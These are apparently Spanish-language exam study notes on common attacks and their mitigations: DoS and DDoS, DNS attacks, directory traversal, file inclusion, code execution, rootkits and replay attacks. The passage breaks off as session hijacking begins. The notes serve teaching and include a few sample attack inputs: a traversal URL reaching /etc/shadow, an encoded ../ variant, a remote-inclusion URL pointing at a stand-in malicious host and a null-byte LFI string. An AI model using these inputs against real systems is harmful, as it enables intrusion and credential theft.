# Actividad Maliciosa

En esta sección se estudian las **actividades maliciosas** y los principales **ciberataques** que afectan a personas, empresas y gobiernos. Debido a que las amenazas evolucionan constantemente y son cada vez más sofisticadas, comprender cómo funcionan es fundamental para prevenirlas y mitigarlas.

El objetivo es **analizar indicadores de actividad maliciosa (Indicators of Malicious Activity)**.

### Temas que se estudiarán

- **Ataques de Denegación de Servicio (DoS y DDoS):**
  - DoS.
  - DDoS.
  - DDoS por amplificación.
  - DDoS por reflexión.
  - Métodos de prevención y mitigación.

- **Ataques contra DNS:**
  - Envenenamiento de caché (DNS Cache Poisoning).
  - Amplificación DNS.
  - DNS Tunneling.
  - Secuestro de dominios (Domain Hijacking).
  - Transferencia de zona DNS (Zone Transfer Attacks).

- **Directory Traversal (Path Traversal):**
  - Explotación de una validación insuficiente de rutas o nombres de archivos para acceder a directorios restringidos.

- **Escalada de privilegios:**
  - Obtención de permisos superiores mediante la explotación de vulnerabilidades.

- **Ataques de repetición (Replay Attacks):**
  - Intercepción y retransmisión de comunicaciones válidas para realizar acciones fraudulentas.

- **Secuestro de sesión (Session Hijacking), Secuestro lateral de sesión/Secuestro de Cookies o Secuestro de Clave de sesión):**
  - Robo de sesiones activas para obtener acceso no autorizado.

- **Inyección de código malicioso:**
  - Inserción de código dañino en una aplicación o sistema para modificar su comportamiento.

- **Indicadores de Compromiso (IoCs):**
  - Bloqueos de cuentas.
  - Sesiones concurrentes inusuales.
  - Contenido bloqueado.
  - Viajes imposibles.
  - Consumo anormal de recursos.
  - Recursos inaccesibles.
  - Inicios de sesión fuera del horario habitual.
  - Mensajes indicando que el sistema fue comprometido.
  - Archivos de registro (logs) faltantes.

En la sección reforzaremos los conceptos y comprobar la comprensión de los distintos tipos de actividad maliciosa, sus mecanismos de ataque y los principales indicadores de compromiso.

# Ataques de Denegación de Servicio (DoS y DDoS)

Un **ataque de Denegación de Servicio (DoS)** es una categoría de ataques cuyo objetivo es **hacer que un servidor, computadora o dispositivo de red deje de estar disponible** para los usuarios legítimos, pero
también puede extenderse a dispositivos de red como conmutadores y enrutadores. Generalmente, esto se logra consumiendo todos los recursos del sistema.

## Tipos de ataques DoS

### • Ataque por inundación (Flood Attack)

Consiste en enviar una gran cantidad de solicitudes a un servidor hasta que no pueda responder.

#### • Ping Flood (ICMP Flood)

Ahora, un ping es técnicamente un paquete de solicitud de eco ICMP pero les gusta llamarlo ping en el exámen.

- Envía una gran cantidad de paquetes **ICMP Echo Request (ping)**, ping tambien es un comando y ICMP sería su protocolo
- Puede mitigarse bloqueando o limitando las respuestas/peticiones ICMP mediante el firewall.
- El resultado de la mitigación es que el atacante simplemente recibe un mensaje de tiempo de espera de la solicitud y el servidor permanece en línea y se detiene la denegación de servicio.

#### • SYN Flood

- El atacante envía múltiples paquetes **SYN** para iniciar conexiones TCP(múltiples sesiones TCP), pero nunca completa el **Three-Way Handshake**(apretón de manos a tres bandas).

Vamos a ver con ejemplo mas claro para que tengamos una idea de como funciona su conexión

Qué significa esto del: Three-Way Handshake (apretón de manos a tres bandas)

Es el proceso que usa TCP para crear una conexión.

Funciona así:

#### Paso 1 — SYN

El cliente dice:

  - "Hola servidor, quiero conectarme."

Cliente -------- SYN --------> Servidor

#### Paso 2 — SYN-ACK

El servidor responde:

  - "Perfecto, yo también estoy listo."

Cliente <----- SYN-ACK ------- Servidor

#### Paso 3 — ACK

El cliente confirma:

  - "Genial, ahora sí podemos comunicarnos."

Cliente -------- ACK --------> Servidor

A partir de ese momento la conexión queda establecida.

#### ¿Qué hace el atacante en un SYN Flood?

Hace solamente esto:

Cliente -------- SYN --------> Servidor

Cliente <----- SYN-ACK ------- Servidor

- Nunca envía el ACK (El ACK es simplemente el tercer mensaje que debería enviar el cliente para terminar de crear la conexión).

Entonces el servidor piensa:

"Bueno... voy a esperar un poco más."

Y reserva memoria para esa conexión.

El atacante vuelve a hacer lo mismo miles de veces:

SYN
SYN
SYN
SYN
SYN
SYN
SYN
SYN
...

El servidor sigue reservando memoria para cada conexión pendiente hasta que se queda sin recursos y deja de atender a usuarios legítimos.


- El servidor mantiene recursos reservados para conexiones incompletas hasta agotarlos. 

**Mitigación:**

- SYN Flood Protection en routers o firewalls.
- IPS (Intrusion Prevention System).
- Reducir el tiempo de espera (timeout) de conexiones semiabiertas. su servidor puede configurarse para que las peticiones medio abiertas se agoten después de un periodo de tiempo, digamos 10, 15 o 30 segundos, y
  esto liberará esos recursos y evitará que se produzca la denegación de servicio.
- Protectores contra inundaciones en la red (Flood Guars).

Esquema/Recorrido:

Antes de mostrar el esquema debemos tener en cuenta que el atacante no se conecta directamente al servidor (a menos que esté en la misma red, lo cual casi nunca ocurre).

El recorrido es:

Atacante
   ↓
Switch
   ↓
Router
   ↓
Internet
   ↓
Router del servidor
   ↓
Switch
   ↓
Servidor (victima)

---

### • Permanent Denial of Service (PDoS)

Ataque que explota vulnerabilidades para **corromper o sobrescribir el firmware** de un dispositivo. Es decir que se trata de un ataque que aprovecha un fallo de seguridad para
romper de forma permanente un dispositivo de red mediante la reinicialización de su firmware. Esto puede provocar que un dispositivo no pueda reiniciarse porque su sistema operativo se sobrescribe.

También se denomina ataque permanente de denegación de servicio porque un reinicio rápido no volverá a poner en línea el sistema. En su lugar, hay que desconectar el dispositivo, hacer una recarga completa del firmware
y volver a conectarlo.

---

### • Fork Bomb (Bomba de Horquilla)

Con una bomba de bifurcación, El atacante crea un gran número de procesos para utilizar la potencia de procesamiento disponible de un ordenador. Este ataque recibe su nombre
porque un proceso se llama bifurcación, y puede bifurcarse(se múltiplica) en dos procesos y luego en cuatro procesos y así sucesivamente hasta que consuma todos los recursos.

Ahora, algunas personas piensan en esto como un gusano debido a la naturaleza auto-replicante, pero no son un gusano porque no infectan programas y no utilizan
la red para propagarse.

En cambio, las bombas de bifurcación sólo se propagan dentro de la memoria caché del procesador en un único ordenador con el que se está atacando, y provoca un ataque de denegación de
servicio y una condición de denegación de servicio, razón por la que se considera que no es un gusano.

Descripciones:

- Crea procesos que se duplican continuamente hasta consumir toda la CPU y la memoria.
- Solo afecta al equipo donde se ejecuta.
- **No es un gusano**, porque no se propaga por la red.

---

# Ataque Distribuido de Denegación de Servicio (DDoS)

Un **DDoS (Distributed Denial of Service)** funciona igual que un DoS, pero utiliza **cientos o miles de equipos comprometidos (bots o zombis)** para atacar simultáneamente a un único servidor

## Características

- Utiliza una **botnet**.
- Los dispositivos infectados normalmente desconocen que participan en el ataque, cuando reciben esa orden de atacar, todas ellas envían
simultáneamente todas sus cargas útiles contra una única víctima.
- Es mucho más difícil de detener que un DoS tradicional.

---

## DNS Amplification Attack (Tipo especial de **DDoS**)

### Funcionamiento

1. El atacante falsifica (**IP Spoofing**) la dirección IP de la víctima.
2. Envía pequeñas consultas DNS a múltiples servidores DNS abiertos.
3. Los servidores responden con respuestas mucho más grandes.
4. Todas esas respuestas llegan a la víctima o a su servidor, saturando su ancho de banda (cantidad máxima de datos que una red puede transmitir por segundo).

> Una consulta DNS pequeña genera una respuesta mucho mayor (**amplificación**), aumentando enormemente el volumen del ataque.

El servidor DNS cree que la petición proviene realmente de la víctima y le envía la respuesta.

El problema es que:

La petición ocupa muy pocos datos.
La respuesta DNS suele ser mucho más grande.

Por eso, una pequeña petición genera una respuesta mucho mayor, amplificando el tráfico enviado a la víctima.

---

# Ejemplo real

En **marzo de 2018**, GitHub sufrió uno de los mayores ataques DDoS registrados.

- Aproximadamente **1.35 Tbps** de tráfico.
- El servicio estuvo fuera de línea durante **5 minutos**.

---

# Mitigación de DoS y DDoS

## • Blackholing (Sinkholing)

- Identifica las IP atacantes.
- Redirige su tráfico hacia una interfaz nula ("agujero negro").
- Es una solución temporal. Porque desgraciadamente, los atacantes pueden trasladarse a una nueva IP y reiniciar el ataque de nuevo, por lo que ésta es sólo una solución temporal.

---

## • IPS (Intrusion Prevention System)

- Detecta y bloquea ataques DoS.
- Es efectivo para ataques pequeños o medianos.
- Puede no ser suficiente frente a un DDoS masivo.

---

## • Infraestructura en la nube elástica (Eficaz pero más caro)

- Escala automáticamente los recursos cuando aumenta el tráfico.
- Permite soportar grandes volúmenes de solicitudes.
- Su desventaja es el incremento del costo durante el ataque. Esta estrategia es que la mayoría de los proveedores de servicios te van a cobrar en función
de la capacidad y los recursos que hayas utilizado, y no estás obteniendo un retorno de esta inversión porque este tráfico fue todo desperdiciado.

---

"Así que hay algunos proveedores de nube especializados que han aceptado este reto. Empresas como CloudFlare y Akamai están diseñadas para
ayudarle a capear estos ataques DDoS".

## • Servicios Anti-DDoS (Eficaz)

Ejemplos:

- Cloudflare
- Akamai

Estos servicios ofrecen:

- Filtrado del tráfico malicioso a aplicaciones web y distribución de contenidos en nombre de su organización.
- CDN (Content Delivery Network).
- Protección contra ataques de gran volumen.
- Alta disponibilidad.
- Defensa en múltiples capas del modelo OSI.

Estos proveedores de servicios se centran en asegurar que usted tiene redes altamente robustas y altamente disponibles que
pueden asegurar que pueden escribir estos ataques DDoS y estos ataques de gran ancho de banda.

Esto también le dará defensas adicionales en capas a través de su modelo OSI. Ayudará a proporcionarle protecciones adicionales.

---

# Resumen para examen

- **DoS:** un único equipo intenta dejar fuera de servicio a la víctima.
- **DDoS:** cientos o miles de equipos (botnet) atacan simultáneamente a la misma víctima.
- **Flood Attack:** satura un sistema enviando enormes cantidades de tráfico.
- **Ping Flood:** inundación de paquetes ICMP.
- **SYN Flood:** conexiones TCP incompletas consumen los recursos del servidor.
- **PDoS:** corrompe el firmware y deja inutilizable un dispositivo.
- **Fork Bomb:** crea procesos infinitos hasta consumir CPU y memoria.
- **DNS Amplification:** amplifica el ataque utilizando respuestas DNS mucho mayores que las consultas.
- **Mitigaciones:** Firewall, IPS, SYN Flood Protection, Blackholing/Sinkholing, infraestructura elástica y servicios especializados como Cloudflare o Akamai.

#### Otro conceoto es:
IP Spoofing: IP falsas (utilizada para inundar el servidor), en si no es tan relevante como los conceptos de exámen visto anteriormente, pero es para tenerlo en cuenta

# Ataques al Sistema de Nombres de Dominio (DNS)

## ¿Qué es el DNS?

El **Sistema de Nombres de Dominio (DNS)** traduce los **nombres de dominio** (ej. google.com) en **direcciones IP**, permitiendo que los dispositivos encuentren el servidor correcto. Debido a que es un servicio esencial de Internet, es un objetivo frecuente de los ciberataques.

---

# Tipos de ataques DNS

## 1. Envenenamiento de caché DNS (DNS Cache Poisoning / DNS Spoofing)

Consiste en **modificar la caché de un servidor DNS** con información falsa para que redirija a los usuarios hacia una **dirección IP controlada por un atacante**. Por ejemplo, un atacante podría envenenar la caché DNS de un sitio web popular de banca en línea y luego
hacer que los usuarios del banco sean redirigidos a un sitio web falso donde sus credenciales de acceso 
podrían ser robadas por los atacantes.

### Objetivo
- Redirigir a los usuarios a sitios web falsos.
- Robar credenciales o distribuir malware.

### Mitigación
- Implementar **DNSSEC** para verificar la autenticidad e integridad de los registros DNS, o las extensiones de seguridad del Sistema de Nombres de Dominio para añadir firmas
digitales a los datos DNS de su organización
- Proteger los servidores DNS con **firewalls** y configuraciones seguras.

---

## 2. Ataque de amplificación DNS (DNS Amplification)

Es un tipo de **ataque DDoS** donde el atacante envía **consultas DNS pequeñas** utilizando la **dirección IP falsificada de la víctima**.

El servidor DNS responde con mensajes mucho más grandes hacia la víctima, saturando su ancho de banda y provocando una denegación de servicio.

### Mitigación
- Limitar el tamaño de las respuestas DNS.
- Aplicar **Rate Limiting** (limitación de tasa) al tráfico DNS.

---

## 3. Tunelización DNS (DNS Tunneling)

Consiste en utilizar el **protocolo DNS (puerto 53)** para transportar tráfico que normalmente no sería DNS (como HTTP o SSH).

Aunque es una técnica legítima, los atacantes la utilizan para:

- Evadir las reglas del firewall con fin de establecer canales de **Comando y Control (C2)**. o tambien filtrar datos de una organización.

### Mitigación

- Monitorear y analizar los **logs/registros DNS**.
- Detectar consultas DNS anómalas o patrones inusuales.

---

## 4. Secuestro de dominios (Domain Hijacking)

También conocido como **robo de dominios**.

Consiste en modificar el registro de un dominio sin autorización, permitiendo que el atacante tome el control del sitio web o redirija a los usuarios hacia una página maliciosa.

### Mitigación

- Proteger la cuenta del registrador del dominio.
- Mantener actualizada la información de la cuenta.
- Utilizar **Domain Registry Lock** para impedir modificaciones no autorizadas.

---

## 5. Ataque de transferencia de zona DNS (DNS Zone Transfer Attack)

El atacante intenta obtener una **copia completa de la zona DNS**, que contiene todos los registros del dominio.

Este tipo de ataque puede exponer información sensible sobre la infraestructura de red del dominio y podría utilizarse como **"Reconocimiento"** para preparar futuros ataques contra la organización.

### Mitigación
- Permitir transferencias de zona únicamente entre servidores autorizados.
- Restringir y autenticar las solicitudes de transferencia.

---

# Resumen

| Ataque | Objetivo | Mitigación |
|---------|----------|------------|
| **Envenenamiento de caché DNS** | Redirigir usuarios a sitios falsos | DNSSEC, firewalls y servidores DNS seguros |
| **Amplificación DNS** | Saturar a la víctima mediante respuestas DNS (DDoS) | Limitar respuestas y aplicar Rate Limiting |
| **Tunelización DNS** | Evadir el firewall y exfiltrar datos | Monitorear y analizar los logs DNS |
| **Secuestro de dominios** | Tomar el control de un dominio | Proteger el registrador y usar Domain Registry Lock |
| **Transferencia de zona DNS** | Obtener información de la infraestructura DNS | Restringir y autenticar las transferencias de zona |

---

# Idea clave

Los ataques DNS buscan **interrumpir servicios, redirigir tráfico o robar información** explotando vulnerabilidades del Sistema de Nombres de Dominio.

Las principales medidas de defensa incluyen:

- Implementar **DNSSEC**.
- Proteger los servidores DNS con **firewalls**.
- Monitorear continuamente los **logs DNS**.
- Limitar el tráfico de respuestas DNS.
- Restringir las transferencias de zona.
- Proteger las cuentas de registro de dominios.

Así que recuerde, los ataques DNS aprovechan las vulnerabilidades del Sistema de Nombres de Dominio para interrumpir el servicio, robar información o redirigir el tráfico de un sitio web.

El envenenamiento de la caché DNS consiste en corromper la caché de un resolutor DNS.

Los ataques de amplificación de DNS utilizan el proceso de resolución de DNS para inundar un objetivo con tráfico y crear una situación de denegación de servicio.

La tunelización DNS puede utilizarse para eludir las reglas del cortafuegos y llevar a cabo la exfiltración de datos.

El secuestro de dominios implica cambios no autorizados en el registro de un dominio. Y el ataque de transferencia de zona DNS tiene como objetivo obtener una
copia de los datos de la zona DNS de un dominio.

Comprendiendo cómo actúan estos ataques se pueden establecer fácilmente mecanismos para evitar que se produzcan.

# Ataques de Directory Traversal e Inclusión de Archivos

## ¿Qué es un Directory Traversal?

Es un **ataque de inyección** donde un atacante manipula la URL o los parámetros de una aplicación web para acceder a **archivos y directorios fuera de la carpeta raíz (Web Root)**.

Su objetivo es **leer archivos sensibles** o **ejecutar archivos del sistema**.

### Ejemplo

Estructura del servidor:

```text
/
├── etc
│   └── shadow
└── home
    └── programs
        └── www_root
            └── index.php
```

Si el atacante escribe:

```text
https://sitio.com/../../../etc/shadow
```

Los `../` hacen que el sistema suba directorios hasta llegar a:

```text
/etc/shadow
```

Si el servidor está mal configurado, el atacante podrá leer ese archivo.

---

### ¿Qué significa `../`?

```text
../
```

Significa:

> "Sube un nivel en la estructura de carpetas."

Ejemplo:

Directorio actual:

```text
/home/programs/www_root
```

Con:

```text
../
```

queda:

```text
/home/programs
```

Otro `../`

```text
/home
```

Otro:

```text
/
```

Luego puede entrar a cualquier carpeta:

```text
/etc
```

---

### ¿Por qué es peligroso?

Porque puede permitir acceder a:

- Archivos de contraseñas.
- Archivos de configuración.
- Claves privadas.
- Bases de datos.
- Scripts del servidor.
- Otros archivos sensibles.

Todo depende de los permisos configurados en el servidor.

---

### Linux vs Windows

En Linux:

```text
../
```

usa la barra:

```text
/
```

En Windows normalmente se usa:

```text
..\
```

Aunque muchos servidores aceptan ambas.

---

### ¿Cómo ocultan el ataque?

En lugar de escribir:

```text
../
```

pueden codificarlo como:

```text
%2e%2e%2f
```

donde:

```text
%2e = .
%2f = /
```

Por lo tanto:

```text
%2e%2e%2f
```

equivale a:

```text
../
```

Esto ayuda a evadir algunos filtros de seguridad.

---

## Inclusión de Archivos (File Inclusion)

Es una vulnerabilidad donde el atacante consigue que la aplicación cargue un archivo que no debería.

Existen dos tipos:

- Remote File Inclusion (RFI)
- Local File Inclusion (LFI)

---

## 1. Remote File Inclusion (RFI)

El atacante hace que el servidor cargue un archivo ubicado **en otro servidor de Internet**.

Ejemplo:

```text
https://sitio.com/login.php?user=http://malware.com/malicioso.php
```

En lugar de cargar un usuario válido, intenta que el servidor ejecute:

```text
malicioso.php
```

que está alojado en otro sitio web.

### Objetivo

- Ejecutar malware.
- Instalar una backdoor (puerta trasera).
- Tomar control del servidor.

---

## 2. Local File Inclusion (LFI)

Aquí el archivo **ya existe dentro del servidor**.

El atacante utiliza un **Directory Traversal** para llegar hasta él.

Ejemplo:

```text
https://sitio.com/login.php?user=../../../Windows/System32/cmd.exe%00
```

Está intentando ejecutar:

```text
cmd.exe
```

que ya existe en el servidor Windows.

---

### ¿Qué significa `%00`?

```text
%00
```

Es un **carácter nulo (Null Byte)**.

Antes se utilizaba para engañar a algunas aplicaciones.

Ejemplo:

La aplicación esperaba:

```text
archivo.php
```

El atacante enviaba:

```text
cmd.exe%00
```

Algunos programas antiguos dejaban de leer la cadena en `%00`, ignorando el `.php` agregado automáticamente y permitiendo ejecutar `cmd.exe`.

---

### Diferencia entre RFI y LFI

| Remote File Inclusion (RFI) | Local File Inclusion (LFI) |
|-----------------------------|----------------------------|
| Carga un archivo desde otro servidor. | Usa un archivo que ya existe en el servidor. |
| Requiere una URL externa. | Utiliza rutas locales. |
| Se utiliza para ejecutar malware remoto. | Se utiliza para acceder o ejecutar archivos locales. |

---

### ¿Cómo prevenir estos ataques?

- Validar y sanitizar todas las entradas del usuario.
- No permitir rutas arbitrarias.
- Restringir el acceso únicamente al **Web Root**.
- Configurar correctamente los permisos de archivos y carpetas.
- Deshabilitar la inclusión de archivos remotos cuando no sea necesaria.
- Filtrar secuencias como `../` y sus versiones codificadas (`%2e%2e%2f`).

---

### Para el examen (muy importante)

✅ Si ves:

```text
../
```

o

```text
..\
```

Piensa inmediatamente en:

> **Directory Traversal**

También recuerda:

> **Local File Inclusion (LFI)** normalmente utiliza **Directory Traversal** para llegar al archivo que quiere cargar.

---

### Esquema para memorizar

```text
Directory Traversal
        │
        ▼
Permite salir del Web Root usando ../
        │
        ▼
Accede a archivos sensibles
        │
        ▼
Puede utilizarse en ataques de Local File Inclusion


Remote File Inclusion (RFI)
        │
        ▼
Carga un archivo desde otro servidor.


Local File Inclusion (LFI)
        │
        ▼
Carga un archivo que ya existe en el servidor.
```

### Resumen rápido

- **Directory Traversal:** utiliza `../` para salir del Web Root y acceder a otros directorios.
- **RFI:** carga un archivo remoto desde otro servidor.
- **LFI:** carga un archivo local que ya existe en el servidor.
- **`%2e%2e%2f`:** versión codificada de `../`.
- **`%00`:** carácter nulo usado antiguamente para evadir algunos mecanismos de seguridad.

# Ejecución de Código, Escalada de Privilegios y Rootkits

## Ejecución Arbitraria de Código (Arbitrary Code Execution - ACE)

Es una vulnerabilidad que permite a un atacante **ejecutar código propio** dentro de un sistema aprovechando una falla de seguridad.

En otras palabras:

> El atacante puede ejecutar cualquier programa o comando que desee en la máquina víctima.

### Ejemplo

Una aplicación tiene una vulnerabilidad.

El atacante aprovecha esa vulnerabilidad para ejecutar:

- Malware.
- Un ransomware.
- Un keylogger.
- Un script de PowerShell.
- Cualquier otro programa.

Todo esto ocurre **sin autorización del propietario del sistema**.

---

## Ejecución Remota de Código (Remote Code Execution - RCE)

Es un **tipo de Ejecución Arbitraria de Código**, pero con una diferencia importante:

> El atacante ejecuta su código **desde otro equipo**, normalmente a través de Internet.

### Diferencia entre ACE y RCE

| Arbitrary Code Execution (ACE) | Remote Code Execution (RCE) |
|-------------------------------|-----------------------------|
| El atacante consigue ejecutar código. | El atacante ejecuta código de forma remota (Internet o red). |
| Puede requerir acceso local. | No necesita acceso físico al equipo. |
| Es un concepto general. | Es un caso específico de ACE. |

### Ejemplo

Un servidor web tiene una vulnerabilidad.

El atacante, desde otro país, envía una petición especialmente diseñada.

El servidor ejecuta:

```text
malware.exe
```

o

```text
powershell.exe
```

sin que el administrador lo autorice.

Eso es **Remote Code Execution (RCE)**.

---

## Escalada de Privilegios (Privilege Escalation)

Ocurre cuando un atacante consigue **más permisos de los que debería tener**.

Generalmente el objetivo es obtener:

- Permisos de administrador.
- Permisos de root (Linux).
- Permisos de SYSTEM (Windows).
- Idealmente, permisos de Administrador de Dominio.

Mientras más privilegios tenga, mayor control tendrá sobre el sistema.

---

## Tipos de Escalada de Privilegios

### 1. Escalada Vertical

El atacante pasa de un nivel de permisos bajo a uno superior.

Ejemplo:

```text
Usuario normal
        │
        ▼
Administrador
        │
        ▼
SYSTEM / Root
```

### Ejemplo real

1. Un usuario abre un correo de spear phishing.
2. Se ejecuta un exploit.
3. El atacante obtiene permisos de Administrador.

Ahora puede:

- Instalar programas.
- Crear usuarios.
- Desactivar el antivirus.
- Modificar archivos del sistema.

---

### 2. Escalada Horizontal

El atacante **no obtiene más privilegios**, sino que accede a los recursos de otro usuario del mismo nivel.

Ejemplo:

```text
Usuario Juan
        │
        ▼
Archivos de Juan

Usuario Pedro
        │
        ▼
Archivos de Pedro
```

Pedro no es administrador.

Pero logra acceder a los archivos privados de Juan.

Ambos siguen siendo usuarios normales.

No aumentó el nivel de privilegios.

Simplemente obtuvo acceso a recursos que no le pertenecían.

---

### ¿Por qué son importantes los privilegios?

Cada aplicación se ejecuta utilizando los permisos del usuario que la abrió.

Por ejemplo:

| Programa | Permisos que utiliza |
|-----------|----------------------|
| Chrome abierto por un usuario normal | Permisos del usuario normal. |
| CMD abierto como Administrador | Permisos de Administrador. |
| Un servicio del sistema | Permisos de SYSTEM. |

Si un atacante consigue ejecutar código dentro de una aplicación:

> Su código heredará los mismos permisos que tenía esa aplicación.

Ejemplo:

Si un servicio de Windows se ejecuta como:

```text
SYSTEM
```

y el atacante consigue inyectar código en ese servicio,

su malware también se ejecutará como:

```text
SYSTEM
```

Por eso las vulnerabilidades de RCE suelen ser tan peligrosas.

---

## Rootkits

Un **Rootkit** es un tipo de malware diseñado para:

- Ocultarse del usuario.
- Ocultarse del antivirus.
- Mantener persistencia.
- Obtener control del sistema.

Generalmente modifica archivos del sistema operativo, muchas veces a nivel del **Kernel**.

Su objetivo es permanecer oculto durante el mayor tiempo posible.

---

### ¿Qué puede hacer un Rootkit?

- Ocultar procesos.
- Ocultar archivos.
- Ocultar malware.
- Instalar otros programas maliciosos.
- Mantener acceso después de reiniciar el equipo.
- Crear persistencia.

Por eso son tan difíciles de detectar.

---

### Los anillos de privilegio (Protection Rings)

El procesador organiza los privilegios mediante anillos.

```text
Ring 0
│
├── Kernel
│
Ring 1
│
├── Drivers
│
Ring 2
│
├── Servicios del sistema
│
Ring 3
│
└── Aplicaciones del usuario
```

Mientras más cerca del **Ring 0**, mayores privilegios existen.

---

### Ring 0 (Kernel)

Es el núcleo del sistema operativo.

Tiene acceso completo al hardware y a la memoria.

Ejemplos:

- Kernel de Windows.
- Kernel de Linux.

Si un malware llega aquí, tendrá control prácticamente total del equipo.

---

### Ring 3 (User Mode)

Es donde funcionan las aplicaciones normales.

Ejemplos:

- Chrome.
- Word.
- Discord.
- Spotify.

Estas aplicaciones tienen muchas menos capacidades que el Kernel.

---

## Tipos de Rootkits

### 1. Kernel Mode Rootkit

Se instala en el **Kernel (Ring 0)**.

Características:

- Máximos privilegios.
- Muy difícil de detectar.
- Puede modificar el funcionamiento del sistema operativo.
- Tiene control prácticamente total del equipo.

Es el tipo más peligroso.

---

### 2. User Mode Rootkit

Se instala en aplicaciones o utiliza funciones del sistema operativo.

Normalmente mantiene la persistencia mediante:

- Registro de Windows.
- Programador de tareas.
- Servicios.
- Inicio automático.

Tiene menos privilegios que un Kernel Rootkit.

---

### Diferencias

| Kernel Mode Rootkit | User Mode Rootkit |
|---------------------|-------------------|
| Funciona en Ring 0. | Funciona en Ring 3. |
| Tiene acceso total al sistema. | Tiene privilegios limitados. |
| Mucho más difícil de detectar. | Más fácil de detectar. |
| Es el más peligroso. | Menos peligroso. |

---

### Resumen rápido

- **Arbitrary Code Execution (ACE):** permite ejecutar código arbitrario en un sistema.
- **Remote Code Execution (RCE):** permite ejecutar código arbitrario de forma remota.
- **Escalada Vertical:** aumenta el nivel de privilegios (Usuario → Administrador → Root/SYSTEM).
- **Escalada Horizontal:** accede a recursos de otro usuario del mismo nivel.
- **Rootkit:** malware diseñado para ocultarse y mantener persistencia.
- **Kernel Mode Rootkit:** funciona en **Ring 0**, tiene el máximo nivel de privilegios y es el más peligroso.
- **User Mode Rootkit:** funciona en modo usuario y suele mantener persistencia mediante funciones del sistema operativo.

---

### Esquema para memorizar

```text
Vulnerabilidad
       │
       ▼
Arbitrary Code Execution (ACE)
       │
       ▼
Remote Code Execution (RCE)
       │
       ▼
Ejecución del malware
       │
       ▼
Escalada de Privilegios
       │
       ├──────────────┐
       ▼              ▼
Vertical         Horizontal
(Usuario → Admin) (Usuario → Otro Usuario)
       │
       ▼
Instalación de Rootkit
       │
       ├──────────────┐
       ▼              ▼
Kernel Mode      User Mode
(Ring 0)         (Ring 3)
```

# Ataques de Repetición (Replay Attack)

## ¿Qué es un Replay Attack?

Un **Replay Attack (Ataque de Repetición)** es un ataque de red en el que un atacante **captura una transmisión de datos válida** y posteriormente la **reenvía (reproduce)** para intentar obtener acceso no autorizado.

El atacante **no necesita modificar la información**, simplemente reutiliza una comunicación legítima.

> Su objetivo es hacer que el sistema crea que la petición original se está realizando nuevamente por el usuario legítimo.

---

# ¿Cómo funciona?

El ataque sigue estos pasos:

1. El usuario se autentica en un sistema.
2. El atacante captura esa comunicación.
3. Guarda los datos interceptados.
4. Más tarde vuelve a enviarlos al servidor.
5. Si el servidor no verifica correctamente la sesión, acepta la petición como válida.

---

# Ejemplo

Supongamos que inicias sesión en tu banco.

```text
Usuario
    │
    │ Usuario + Contraseña
    ▼
Servidor del Banco
```

Un atacante captura esa comunicación.

Más tarde envía exactamente los mismos datos:

```text
Atacante
    │
    │ Usuario + Contraseña capturados
    ▼
Servidor del Banco
```

Si el servidor acepta nuevamente esa información, el atacante podrá iniciar sesión como si fuera el usuario legítimo.

---

# Otro ejemplo

Inicias sesión en una tienda online.

El atacante captura:

- Usuario.
- Contraseña.
- Token de autenticación.

Más tarde reutiliza esa información para:

- Realizar compras.
- Cambiar la contraseña.
- Bloquear el acceso al propietario.
- Robar la cuenta.

---

# Replay Attack vs Session Hijacking

| Replay Attack | Session Hijacking |
|---------------|-------------------|
| Captura una comunicación válida y la reutiliza más tarde. | Toma control de una sesión activa en tiempo real. |
| Normalmente no modifica los datos. | Puede modificar la información enviada y recibida. |
| Reproduce una transmisión anterior. | Interfiere durante la sesión activa. |

**Diferencia clave:**

- **Replay Attack:** reutiliza una comunicación capturada.
- **Session Hijacking:** secuestra una sesión que aún está activa.

---

# ¿Cómo prevenir un Replay Attack?

## 1. Session Tokens (Tokens de Sesión)

Cada vez que un usuario inicia sesión, el servidor genera un **Session Token** único.

Ejemplo:

```text
Token:
A81F-92DB-7D21-BC55
```

Ese token identifica únicamente esa sesión.

Si un atacante intenta reutilizar un token expirado o inválido, el servidor lo rechazará.

---

## 2. Autenticación Multifactor (MFA)

Aunque el atacante capture:

- Usuario.
- Contraseña.

Todavía necesitará el segundo factor.

Por ejemplo:

- Código de Google Authenticator.
- Microsoft Authenticator.
- SMS.
- Llave física (FIDO2/U2F).
- Huella digital.

Como los códigos OTP cambian cada **30 o 60 segundos**, reutilizarlos resulta extremadamente difícil.

---

## 3. Protocolos seguros

Utilizar protocolos modernos dificulta la captura y reutilización de las comunicaciones.

Ejemplo:

- WPA3 (Wi-Fi Protected Access 3).

Esto protege mejor las redes inalámbricas frente a ataques de repetición.

---

# ¿Por qué funcionan estos ataques?

Porque algunos sistemas:

- No verifican que la petición sea única.
- No invalidan correctamente los tokens.
- No utilizan números aleatorios (*Nonce*).
- No verifican marcas de tiempo (*Timestamps*).

Entonces el servidor interpreta la petición repetida como si fuera completamente nueva.

---

# Conceptos importantes

## Session Token

Es un identificador único generado para cada sesión autenticada.

Sirve para identificar al usuario mientras permanece conectado.

---

## Nonce

Es un valor aleatorio que solo puede utilizarse **una única vez**.

Su función es impedir que una petición pueda reutilizarse.

Si un atacante vuelve a enviar la misma petición, el servidor detectará que el **Nonce** ya fue usado y la rechazará.

---

## Timestamp

Es una marca de tiempo incluida en la comunicación.

Si el mensaje llega demasiado tarde, el servidor lo considera inválido.

Esto evita que una comunicación antigua pueda reproducirse horas o días después.

---

# Resumen rápido

- **Replay Attack:** reutiliza una comunicación válida capturada anteriormente.
- El atacante **no necesita modificar** los datos.
- Su objetivo es autenticarse o ejecutar acciones como si fuera el usuario legítimo.
- **Session Hijacking** secuestra una sesión activa; **Replay Attack** reproduce una comunicación pasada.
- Las mejores defensas son:
  - Session Tokens.
  - Nonces.
  - Timestamps.
  - Autenticación Multifactor (MFA).
  - Protocolos seguros como WPA3.

---

# Esquema para memorizar

```text
Usuario inicia sesión
          │
          ▼
Servidor genera Session Token
          │
          ▼
Atacante captura la comunicación
          │
          ▼
Guarda los datos
          │
          ▼
Los vuelve a enviar más tarde
          │
          ▼
¿El servidor valida Token + Nonce + Timestamp?
          │
      ┌───┴───┐
      ▼       ▼
     Sí       No
     │         │
 Rechaza    Replay Attack
 petición    exitoso
```
# Secuestro de Sesión (Session Hijacking)

#### "Antes de entrar a ver lo que es secuestro de sesión, primero vemos cosas más basicas como la Gestión de Sesiones para tener una idea más clara luego cuando veamos Secuestro de Sesión".

## ¿Qué es la Gestión de Sesiones?

La **Gestión de Sesiones (Session Management)** es el mecanismo que utilizan las aplicaciones web para identificar de forma unica a un usuario durante toda su interacción con el sitio.

Permite que el servidor recuerde información como:

